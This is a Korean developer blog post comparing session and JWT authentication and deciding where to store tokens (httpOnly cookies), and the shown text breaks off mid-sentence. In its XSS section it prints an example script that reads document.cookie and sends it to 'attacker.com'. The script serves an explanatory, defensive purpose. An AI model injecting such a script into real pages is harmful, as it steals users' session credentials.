<!DOCTYPE html><html lang="ko-KR" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="인증방식 고민" /><meta property="og:locale" content="ko_KR" /><meta name="description" content="세션 인증 방식과 JWT 인증 방식의 차이 세션 방식 서버에서 사용자 정보를 key-value 저장소에 저장 서버에서 key를 사용자 쿠키에 담아서 전송 사용자가 인증이 필요한 요청을 하면 요청과 함께 키가 담긴 쿠키가 서버로 전송됨 서버는 key를 가지고 key-value 저장소를 조회하여 인증정보가 유효함을 확인함 세션 방식의 문제 인증 정보가 key-value 저장소에 저장되기 때문에 인증 요청이 많아질수록 key-value 저장소에 저장되는 인증 정보량도 증가함 인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에 인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다. 한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도 많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다. JWT(Json Web Token) 인증정보를 key-value 저장소에 저장하는게 아니라 사용자 고유키를 포함한 몇 가지 정보를 쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다. 이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 막기 위해 전자서명을 담아서 위조를 방지한다. 전자서명(Signature) 생성 Header + Payload를 Base64Url 인코딩 Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성 비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성 Header.Payload.Signature 형태의 JWT 응답 전자서명 검증 JWT에서 Header, Payload, Signature 분리 Header + Payload를 Base64Url 인코딩 (클라이언트가 보낸 값 그대로 사용) Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산 공개키(Public Key)로 Signature를 검증 Signature를 공개키로 복호화 복호화된 값(원래 해시)과 직접 계산한 해시 값 비교 일치하면 유효한 토큰, 다르면 위조된 토큰 JWT 운영 Access 토큰 사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰 인증 여부를 판별할때 사용하기에 유효기간을 짧게 두어 토큰이 탈취되었을 때 위험을 최소화한다. Refresh 토큰 Access 토큰을 재발행할 때 사용하는 토큰이다. Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여 Access 토큰을 재발행한다. JWT 인증이 세션 방식보다 좋은 점 key-value 저장소를 운영하지 않을 수 있다. 이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에 key-value 저장소를 운영할 필요가 없다. 다만 Refresh 토큰 탈취를 대비하여 블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다. 하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로 세션 key-value 스토어보다 저장되는 데이터는 적다. DB 조회 최소화 극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보 (이름, 닉네임, 생년월일) 등을 JWT에 저장하면 DB 조회 수를 줄일 수 있다. 다만 많은 정보를 저장할수록 JWT 길이가 길어져서 인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다. JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에 생년월일 등의 민감정보는 저장하지 않는 것이 좋다. 그래서 어떤 방법을 선택? 현재 팀은 JWT 인증 방식 경험이 더 많으므로 JWT 인증 방식 선택 JWT payload에는 사용자 고유키만 포함" /><meta property="og:description" content="세션 인증 방식과 JWT 인증 방식의 차이 세션 방식 서버에서 사용자 정보를 key-value 저장소에 저장 서버에서 key를 사용자 쿠키에 담아서 전송 사용자가 인증이 필요한 요청을 하면 요청과 함께 키가 담긴 쿠키가 서버로 전송됨 서버는 key를 가지고 key-value 저장소를 조회하여 인증정보가 유효함을 확인함 세션 방식의 문제 인증 정보가 key-value 저장소에 저장되기 때문에 인증 요청이 많아질수록 key-value 저장소에 저장되는 인증 정보량도 증가함 인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에 인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다. 한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도 많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다. JWT(Json Web Token) 인증정보를 key-value 저장소에 저장하는게 아니라 사용자 고유키를 포함한 몇 가지 정보를 쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다. 이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 막기 위해 전자서명을 담아서 위조를 방지한다. 전자서명(Signature) 생성 Header + Payload를 Base64Url 인코딩 Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성 비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성 Header.Payload.Signature 형태의 JWT 응답 전자서명 검증 JWT에서 Header, Payload, Signature 분리 Header + Payload를 Base64Url 인코딩 (클라이언트가 보낸 값 그대로 사용) Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산 공개키(Public Key)로 Signature를 검증 Signature를 공개키로 복호화 복호화된 값(원래 해시)과 직접 계산한 해시 값 비교 일치하면 유효한 토큰, 다르면 위조된 토큰 JWT 운영 Access 토큰 사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰 인증 여부를 판별할때 사용하기에 유효기간을 짧게 두어 토큰이 탈취되었을 때 위험을 최소화한다. Refresh 토큰 Access 토큰을 재발행할 때 사용하는 토큰이다. Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여 Access 토큰을 재발행한다. JWT 인증이 세션 방식보다 좋은 점 key-value 저장소를 운영하지 않을 수 있다. 이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에 key-value 저장소를 운영할 필요가 없다. 다만 Refresh 토큰 탈취를 대비하여 블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다. 하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로 세션 key-value 스토어보다 저장되는 데이터는 적다. DB 조회 최소화 극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보 (이름, 닉네임, 생년월일) 등을 JWT에 저장하면 DB 조회 수를 줄일 수 있다. 다만 많은 정보를 저장할수록 JWT 길이가 길어져서 인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다. JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에 생년월일 등의 민감정보는 저장하지 않는 것이 좋다. 그래서 어떤 방법을 선택? 현재 팀은 JWT 인증 방식 경험이 더 많으므로 JWT 인증 방식 선택 JWT payload에는 사용자 고유키만 포함" /><link rel="canonical" href="https://a3magic3pocket.github.io/posts/exploring-authentication-options/" /><meta property="og:url" content="https://a3magic3pocket.github.io/posts/exploring-authentication-options/" /><meta property="og:site_name" content="의사줌치" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-04-06T08:49:12+09:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="인증방식 고민" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"세션 인증 방식과 JWT 인증 방식의 차이 세션 방식 서버에서 사용자 정보를 key-value 저장소에 저장 서버에서 key를 사용자 쿠키에 담아서 전송 사용자가 인증이 필요한 요청을 하면 요청과 함께 키가 담긴 쿠키가 서버로 전송됨 서버는 key를 가지고 key-value 저장소를 조회하여 인증정보가 유효함을 확인함 세션 방식의 문제 인증 정보가 key-value 저장소에 저장되기 때문에 인증 요청이 많아질수록 key-value 저장소에 저장되는 인증 정보량도 증가함 인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에 인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다. 한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도 많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다. JWT(Json Web Token) 인증정보를 key-value 저장소에 저장하는게 아니라 사용자 고유키를 포함한 몇 가지 정보를 쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다. 이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 막기 위해 전자서명을 담아서 위조를 방지한다. 전자서명(Signature) 생성 Header + Payload를 Base64Url 인코딩 Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성 비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성 Header.Payload.Signature 형태의 JWT 응답 전자서명 검증 JWT에서 Header, Payload, Signature 분리 Header + Payload를 Base64Url 인코딩 (클라이언트가 보낸 값 그대로 사용) Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산 공개키(Public Key)로 Signature를 검증 Signature를 공개키로 복호화 복호화된 값(원래 해시)과 직접 계산한 해시 값 비교 일치하면 유효한 토큰, 다르면 위조된 토큰 JWT 운영 Access 토큰 사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰 인증 여부를 판별할때 사용하기에 유효기간을 짧게 두어 토큰이 탈취되었을 때 위험을 최소화한다. Refresh 토큰 Access 토큰을 재발행할 때 사용하는 토큰이다. Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여 Access 토큰을 재발행한다. JWT 인증이 세션 방식보다 좋은 점 key-value 저장소를 운영하지 않을 수 있다. 이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에 key-value 저장소를 운영할 필요가 없다. 다만 Refresh 토큰 탈취를 대비하여 블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다. 하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로 세션 key-value 스토어보다 저장되는 데이터는 적다. DB 조회 최소화 극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보 (이름, 닉네임, 생년월일) 등을 JWT에 저장하면 DB 조회 수를 줄일 수 있다. 다만 많은 정보를 저장할수록 JWT 길이가 길어져서 인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다. JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에 생년월일 등의 민감정보는 저장하지 않는 것이 좋다. 그래서 어떤 방법을 선택? 현재 팀은 JWT 인증 방식 경험이 더 많으므로 JWT 인증 방식 선택 JWT payload에는 사용자 고유키만 포함","url":"https://a3magic3pocket.github.io/posts/exploring-authentication-options/","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://a3magic3pocket.github.io/posts/exploring-authentication-options/"},"headline":"인증방식 고민","dateModified":"2025-04-11T22:27:26+09:00","datePublished":"2025-04-06T08:49:12+09:00","@context":"https://schema.org"}</script><title>인증방식 고민 | 의사줌치</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="의사줌치"><meta name="application-name" content="의사줌치"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-5NQ41XXW83"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-5NQ41XXW83'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sample/avatar-crop.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">의사줌치</a></div><div class="site-subtitle font-italic">부정확한 정보를 <br /> 담고 있을 수 있습니다.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/a3magic3pocket" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['a3magic3pocket','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>인증방식 고민</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>인증방식 고민</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> 의사줌치 </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Apr 6, 2025, 8:49 AM +0900" prep="on" > Apr 6 <i class="unloaded">2025-04-06T08:49:12+09:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Fri, Apr 11, 2025, 10:27 PM +0900" prefix="Updated " > Apr 11 <i class="unloaded">2025-04-11T22:27:26+09:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3426 words">19 min</span></div></div><div class="post-content"><h2 id="세션-인증-방식과-jwt-인증-방식의-차이">세션 인증 방식과 JWT 인증 방식의 차이</h2><ul><li>세션 방식<ul><li>서버에서 사용자 정보를 key-value 저장소에 저장<li>서버에서 key를 사용자 쿠키에 담아서 전송<li>사용자가 인증이 필요한 요청을 하면<br /> 요청과 함께 키가 담긴 쿠키가 서버로 전송됨<li>서버는 key를 가지고 key-value 저장소를 조회하여<br /> 인증정보가 유효함을 확인함</ul><li>세션 방식의 문제<ul><li>인증 정보가 key-value 저장소에 저장되기 때문에<br /> 인증 요청이 많아질수록 key-value 저장소에 저장되는<br /> 인증 정보량도 증가함<li>인증이 필요한 요청마다 key-value 저장소를 조회하기 때문에<br /> 인증 정보가 너무 많이 저장된 경우 조회 성능도 줄어든다.<li>한 명의 유저가 여러 디바이스를 가지고 다중 접속하는 경우도<br /> 많아지기에 key-value 저장소가 성능 문제를 일으킬수도 있다.</ul><li>JWT(Json Web Token)<ul><li>인증정보를 key-value 저장소에 저장하는게 아니라<br /> 사용자 고유키를 포함한 몇 가지 정보를<br /> 쿠키에 담거나, 응답으로 준 뒤 헤더(Authorization) 받는 방법이다.<li>이때 클라이언트에서 임의로 사용자 고유키를 변경하는 것을 <br /> 막기 위해 전자서명을 담아서 위조를 방지한다.<li>전자서명(Signature) 생성<ul><li>Header + Payload를 Base64Url 인코딩<li>Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 생성<li>비밀키(Private Key)로 해시 값을 암호화하여 Signature 생성<li>Header.Payload.Signature 형태의 JWT 응답</ul><li>전자서명 검증<ul><li>JWT에서 Header, Payload, Signature 분리<li>Header + Payload를 Base64Url 인코딩 <br /> (클라이언트가 보낸 값 그대로 사용)<li>Base64Url(Header + “.” + Payload)의 해시(SHA-256)를 계산<li>공개키(Public Key)로 Signature를 검증<ul><li>Signature를 공개키로 복호화<li>복호화된 값(원래 해시)과 직접 계산한 해시 값 비교</ul><li>일치하면 유효한 토큰, 다르면 위조된 토큰</ul></ul><li>JWT 운영<ul><li>Access 토큰<ul><li>사용자 고유키를 포함한 몇 가지 정보가 담긴 토큰<li>인증 여부를 판별할때 사용하기에<br /> 유효기간을 짧게 두어 <br /> 토큰이 탈취되었을 때 위험을 최소화한다.</ul><li>Refresh 토큰<ul><li>Access 토큰을 재발행할 때 사용하는 토큰이다.<li>Refresh 토큰이 유효하다면 Refresh 토큰을 이용하여<br /> Access 토큰을 재발행한다.</ul></ul><li>JWT 인증이 세션 방식보다 좋은 점<ul><li>key-value 저장소를 운영하지 않을 수 있다.<ul><li>이미 사용자 정보가 Access 토큰에 포함되어 있기 때문에<br /> key-value 저장소를 운영할 필요가 없다.<li>다만 Refresh 토큰 탈취를 대비하여<br /> 블랙리스트 제도를 도입한다면 key-value 저장소를 운영해야한다.<br /> 하지만 이때에도 블랙리스트로 등록된 refresh 토큰만 조회하므로<br /> 세션 key-value 스토어보다 저장되는 데이터는 적다.</ul><li>DB 조회 최소화<ul><li>극단적으로 사용자 고유키 외에 인증에 필요한 다양한 정보<br /> (이름, 닉네임, 생년월일) 등을 JWT에 저장하면<br /> DB 조회 수를 줄일 수 있다.<li>다만 많은 정보를 저장할수록 JWT 길이가 길어져서<br /> 인증이 필요한 요청을 할때마다 주고 받는 데이터 양이 증가한다.<li>JWT payload는 JWT 토큰 탈취 시에 그대로 노출되기 때문에<br /> 생년월일 등의 민감정보는 저장하지 않는 것이 좋다.</ul></ul><li>그래서 어떤 방법을 선택?<ul><li>현재 팀은 JWT 인증 방식 경험이 더 많으므로<br /> JWT 인증 방식 선택<li>JWT payload에는 사용자 고유키만 포함</ul></ul><h2 id="jwt를-어디에-저장할까">JWT를 어디에 저장할까?</h2><ul><li>웹에서 인증정보를 저장하는 것에 어려움<ul><li>웹 브라우저에서 javascript로 접근 가능한 저장소는 XSS 공격을 받을 수 있다.<li>XSS(Cross-Site-Scripting)<ul><li>악의적인 스크립트 코드를 다른 사용자의 브라우저에서 실행시키는 공격<li>일반적인 브라우저에서는 동일 출처 정잭(Same origin policy)를 <br /> 갖기 때문에 이메일 등을 이용한 우회적인 방법으로는 <br /> XSS 공격을 실행시키기 어렵다.<li>다만 사이트 내에 사용자가 입력할 수 있는 정보가 있고<br /> script 예외처리가 제대로 처리되지 않은 경우에는<br /> XSS 공격을 실행시킬 수 있다.<li>XSS 공격의 핵심은 javascript로 접근 가능한 <br /> 쿠키나 로컬스토리지에 담긴 인증 정보를 <br /> 공격자가 악의적 스크립트를 삽입하여 탈취하는 것이다.</ul><li>XSS 예시<ul><li>시나리오<ul><li>공격자는 이메일로 사용의 helloworld.com 인증정보를 <br /> 탈취하고자 한다.<li>helloworld.com은 인증정보를 httpOnly = false로 쿠키에 저장한다.<li>사용자는 구형 브라우저로 사용 중이라 samesite = none이 기본값이다.<li>이메일 제공자는 어떠한 스크립트 방어 정책도 제공하지 않는다.<li>사용자는 helloworld.com에 최근 로그인한 상태라 브라우저에서<br /> 인증정보를 가지고 있다.<li>공격자 사이트로 해당 쿠기가 담겨 전송된다.</ul><li>이메일 악성 스크립트 예시<div class="language-html highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>  
	<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://attacker.com/steal-cookies</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>  
		<span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>  
		<span class="na">headers</span><span class="p">:</span> <span class="p">{</span>  
			<span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">application/json</span><span class="dl">'</span>  
		<span class="p">},</span>  
		<span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>  
			<span class="na">cookies</span><span class="p">:</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="c1">//사용자의 쿠키 정보 추출  </span>
		<span class="p">})</span>  
	<span class="p">})</span>  
	<span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">쿠키 전송 완료</span><span class="dl">'</span><span class="p">))</span>  
	<span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">error</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">에러 발생</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">));</span>  
<span class="nt">&lt;/script&gt;</span>  
</pre></table></code></div></div></ul></ul><li>웹 브라우저에서 인증 정보를 저장할 수 있는 장소<ul><li>로컬 스토리지<ul><li>Javascript로 로컬 스토리지 조회가 가능하기 때문에 XSS 공격에 취약하다.</ul><li>쿠키(httpOnly = false)<ul><li>Javascript로 조회가 쿠키(httpOnly = false )가능하기 때문에 <br /> XSS 공격에 취약하다.</ul><li>메모리 저장소<ul><li>Redux, Recoil, Zustand와 같이 전역 state 저장소를 사용할 수도 있다.<li>XSS로 메모리 영역 변수 조회를 하기는 어렵다.<li>하지만 새로 고침 시 초기화 되므로 계속 사용하기 어렵다.</ul><li>쿠키(httpOnly = true)<ul><li>웹 브라우저 javascript 로는 httpOnly = true 쿠키를 조회할 수 없다.<li>samesite = lax로 설정하면 브라우저가 다른 도메인으로 요청한 경<br /> httpOnly = true가 함께 전달되지 않는다.<li>웹 브라우저에서는 해당 쿠키를 아예 조회할 수 없기 때문에<br /> 쿠키 관련된 처리는 모두 서버에서 처리한다.</ul></ul><li>그래서 어디에 저장?<ul><li>쿠키(httpOnly = true)에 저장한다.</ul></ul><h2 id="클라이언트에게-현재-인증-여부를-알리는-방법">클라이언트에게 현재 인증 여부를 알리는 방법</h2><ul><li>서버에서 쿠키(httpOnly = true)로 인증정보를 저장하면<br /> 클라이언트에서는 인증정보를 아예 볼 수 없기 때문에<br /> 현재 인증 여부를 알 수 없다.<li>방법1 - 직접 인증이 필요한 요청을 날려서 확인하기<ul><li>메인페이지의 [로그인/로그아웃] 버튼과 같이<br /> 인증 없이 들어갈 수 있는 페이지에서<br /> 인증 여부에 따라 다르게 표시해야하는 경우가 있다.<li>사용자가 메인페이지에 접속할때마다<br /> 인증이 필요한 요청을 먼저 날려서 <br /> 인증 유무를 파악해야한다.<li>불필요한 요청으로 인하여 트래픽이 증가하고<br /> 접속마다 상태를 확인하기 때문에<br /> 빈번한 렌더링으로 사용자 경험이 안 좋아진다.</ul><li>방법2 -서버에서 JWT 응답 본문에 인증 만료 시간 포함<ul><li>JWT 발급 시 본문에 인증 만료 시간을 포함시켜<br /> 클라이언트에서 인증이 언제 만료되는지 알 수 있게 한다.<li>방법1의 단점을 모두 보완할 수 있지만<br /> 클라이언트에서 만료 시간을 확인하고<br /> 요청 전에 만료시간과 비교해서<br /> 인증 유효여부를 판별해야한다는 불편함이 있다.</ul><li>방법3 - 서버에서 인증 쿠키와 동일한 생명주기를 가진 <br /> 더미 힌트 쿠키를 응답에 포함<ul><li>더미 힌트 쿠키는 httpOnly = false이기 때문에<br /> 클라이언트에서 조회할 수 있다.<li>더미 힌트 쿠키는 인증 쿠키와 생명주기가 같기 때문에<br /> 인증쿠키가 만료되면 더미 힌트 쿠키도 만료되어<br /> 없어지게 된다.<li>따라서 클라이언트에서는 더미 힌트 쿠키 조회하여<br /> 존재 유무에 따라 인증여부를 판단한다.<li>더미 힌트 쿠키는 매 요청마다 함께 전송되기 떄문에 <br /> body를 비우거나 아주 작은 값만 넣어 데이터를 최소화한다.</ul><li>그래서 어떤 방법 선택?<ul><li>더미 힌트 쿠키로 구현해보자.</ul></ul><h2 id="refresh-토큰에-사용자-식별자를-포함시켜야할까">Refresh 토큰에 사용자 식별자를 포함시켜야할까?</h2><ul><li>포함시킨다.<ul><li>장점<ul><li>DB 조회 없이 Refresh 토큰만으로 Access 토큰은 발급할 수 있다.</ul><li>단점<ul><li>Refresh 토큰 탈취 시 사용자 식별자도 함께 탈취된다.</ul></ul><li>포함시키지 않는다.<ul><li>설명<ul><li>key-value 저장소에 key: UUID, value: 사용자 식별자를 저장한다.<li>Refresh 토큰에는 UUID만 담는다.<li>Refresh 토큰으로 Access 토큰 생성 시 UUID를 이용하여 <br /> 사용자 식별자를 찾아 Access 토큰을 발급한다.</ul><li>장점<ul><li>Refresh 토큰이 탈취되어도 사용자 식별자는 탈취되지 않는다.</ul><li>단점<ul><li>Access 토큰이 만료될 때마다 key-value 저장소를 조회한다.<li>이 경우에도 세션보다는 key-value 저장소 조회 빈도는 적다.<li>세션은 매 요청마다 key-value 저장소를 조회해야 하지만<br /> Refresh UUID 에서는 Access 토큰 만료 후 요청 시에만 <br /> key-value 저장소를 조회한다.</ul></ul><li>암호화하여 포함시킨다.<ul><li>장점<ul><li>DB 조회 없이 Refresh 토큰만으로 Access 토큰을 발급할 수 